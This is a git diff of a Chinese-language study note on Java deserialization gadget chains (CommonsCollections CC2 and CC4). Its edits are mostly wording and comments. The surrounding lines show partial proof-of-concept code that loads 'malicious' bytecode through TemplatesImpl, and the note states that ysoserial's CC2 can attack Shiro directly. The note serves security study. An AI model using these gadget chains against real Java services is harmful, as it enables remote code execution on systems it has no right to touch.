@@ -252,8 +252,10 @@ public class CC2_1 {
 
 <img width="1336" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/b3e25807-dfa5-4761-8503-a82c124a8d0f">
 
-### 3.1.1 CC2 POC
-Ysoserial中的 `CC2` 最终是用的 `TemplatesImpl` 来执行命令的，且数组长度为1，所以 `Ysoserial` 原生的 `CC2` 可以直接用来攻击 `shiro` 。
+### 3.1.2 ysoserial 中的 CC2-TemplatesImpl-POC
+`ysoserial` 工具中的 `CC2` 最终是用的 `TemplatesImpl` 来执行命令的，且数组长度为 1 ，所以 `ysoserial` 原生的 `CC2` 可以直接用来攻击 `shiro` 。
+
+关于 `TemplatesImpl` ，不记得的话可以回顾一下 [CC3 中学到的利用 TemplatesImpl 加载字节码](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC3.md#22-%E5%88%A9%E7%94%A8-templatesimpl-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81)
 
 📒 CC2_yso_TemplatesImpl
 
@@ -281,7 +283,7 @@ public class CC2_yso_TemplatesImpl {
         // 创建 TemplatesImpl 对象
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_bytecodes", new byte[][]{getBytescode()});
-        setFieldValue(templates, "_name", "HelloTemplatesImpl");
+        setFieldValue(templates, "_name", "xxx");
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
         // 创建⼀个⼈畜⽆害的 InvokerTransformer 对象，并先⽤它实例化 Comparator, 避免 queue.add 的时候触发命令
@@ -312,6 +314,7 @@ public class CC2_yso_TemplatesImpl {
         field.set(obj, value);
     }
 
+    // 使用 javassist 获取恶意字节码的方法
     protected static byte[] getBytescode() throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
@@ -401,8 +404,9 @@ public class CC4_1 {
         unserialize("ser_CC4_TrAXFilter_TemplatesImpl.bin");
 
     }
+
     protected static byte[] getBytescode() throws Exception {
-        // 使用javassist操作字节码
+        // 使用 javassist 操作恶意字节码
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
         return clazz.toBytecode();
